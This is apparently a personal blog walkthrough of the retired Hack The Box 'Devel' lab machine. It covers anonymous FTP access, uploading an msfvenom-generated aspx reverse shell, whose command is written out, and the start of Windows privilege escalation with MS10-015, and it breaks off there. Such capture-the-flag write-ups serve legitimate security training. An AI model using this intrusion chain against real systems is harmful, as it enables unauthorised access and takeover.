# Hack The Box - Devel walkthrough

![](/photos/devel-photos/devel.png)

Today I am writing a walkthrough of the retired Devel machine of Hack The box.  
It is a Windows based machine.  
This machine has a static IP address <10.10.10.5>  
It was a nice easy and interesting machine.  
  
You have to found **user.txt** and **root.txt** flag. 

## Penetration Methodology

* Scanning
  * open ports, versions and services
* Enumeration
  * ftp enumeration
  * http enumeration
  * execute reverse shell
* Post Exploitation
  * user flag
  * root flag

## Scanning

Let's start our nmap to know about **open ports**, **versions** and **services** running on the machine.

![](/photos/devel-photos/devel-nmap.png)

Now we are done with our nmap.  

## Enumeration

As nmap shows us that ftp service is open and  
we can login to ftp with anonymous user.

![](/photos/devel-photos/ftp-acess.png)

As we can see that there is image name **welcome.png**  
Let's try we can access that image from the website or not.

**Wow**  
we can access ftp files from website. 

![](/photos/devel-photos/welcome.png)

Now let's upload our reverse shell on ftp server
But first check about the version and type of file which we can run on the website.

![](/photos/devel-photos/asp.png)

As we can see that this is a asp.net website.  
We can now upload our aspx reverse shell on ftp server.  
But first we have to generate it using **msfvenom**

`msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=4444 -f aspx > shell.aspx`

Now let's upload the aspx shell to ftp.

![](/photos/devel-photos/ftp-shell.png)

Let's execute our **aspx shell** from the website.  
Before executing start the listener.  

**Hey we got the shell**  
We are now **iis apppool\web**

![](/photos/devel-photos/shell.png)

## Post Exploitation

Let's enumerate for user flag  
Right now we can't read any flag so let's escalate our privelages.

![](/photos/devel-photos/denied.png)

Let's try **windwos-exploit suggestor** copy systeminfo and try with that.

as **windwos-exploit suggestor** suggests us a bunch of exploit.  
So let's try MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege.  

Firstly download the exploit..

![](/photos/devel-photos/ms.png)




